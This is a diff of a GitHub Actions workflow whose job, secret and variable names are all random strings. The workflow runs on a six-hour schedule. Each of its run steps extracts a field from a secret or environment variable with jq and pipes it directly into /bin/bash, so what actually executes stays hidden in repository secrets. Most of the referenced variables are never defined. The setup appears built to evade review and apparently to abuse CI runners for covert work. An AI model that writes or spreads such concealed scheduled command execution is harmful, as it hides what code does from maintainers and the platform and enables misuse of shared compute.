@@ -2,32 +2,30 @@ name: niuyaorao3187
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '7 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: niuyaorao3187
         env:
-          iisk5161: ${{ secrets.iisk5161 }}
+          mvap990: ${{ secrets.mvap990 }}
         run: |
-          echo $iisk5161 | jq -r .ui72 | /bin/bash
-          echo $zmlq38 | jq -r .qjrhl48030 | /bin/bash
-          echo $xhd63341 | jq -r .jgoy60 | /bin/bash
-          echo $ir967 | jq -r .iahtw9 | /bin/bash
-          echo $u101 | jq -r .qhwr1 | /bin/bash
-          echo $jwlcs57 | jq -r .yxwh0 | /bin/bash
-          echo $pbnki47125 | jq -r .imvl57713 | /bin/bash
-          echo $ofm1943 | jq -r .s734 | /bin/bash
-          echo $tvi83 | jq -r .bx42 | /bin/bash
-          echo $rg5676 | jq -r .nkqn374 | /bin/bash
-          echo $ed6160 | jq -r .uz294 | /bin/bash
-          echo $egp6090 | jq -r .zwu92 | /bin/bash
-          echo $at18114 | jq -r .u2 | /bin/bash
-          echo $xaxp1 | jq -r .x93659 | /bin/bash
-          echo $v7566 | jq -r .noyad1268 | /bin/bash
-          echo $b60 | jq -r .bldw9 | /bin/bash
-          echo $rtlm27595 | jq -r .iv1735 | /bin/bash
+          echo $mvap990 | jq -r .pbxkv1726 | /bin/bash
+          echo $y54240 | jq -r .ozp88648 | /bin/bash
+          echo $czsc265 | jq -r .pc045 | /bin/bash
+          echo $s0 | jq -r .e2869 | /bin/bash
+          echo $xigo41 | jq -r .ybfve99 | /bin/bash
+          echo $jqp14 | jq -r .rf84 | /bin/bash
+          echo $vmy5 | jq -r .xlaus8123 | /bin/bash
+          echo $qy841 | jq -r .ccmt849 | /bin/bash
+          echo $st9 | jq -r .nvv51 | /bin/bash
+          echo $dsa96647 | jq -r .ghxh22 | /bin/bash
+          echo $zf601 | jq -r .ocjhn50 | /bin/bash
+          echo $i10 | jq -r .j11612 | /bin/bash
+          echo $lv328 | jq -r .zy06818 | /bin/bash
+          echo $lfnc42 | jq -r .sat17 | /bin/bash
+          echo $mkhu9076 | jq -r .vnn58810 | /bin/bash
 
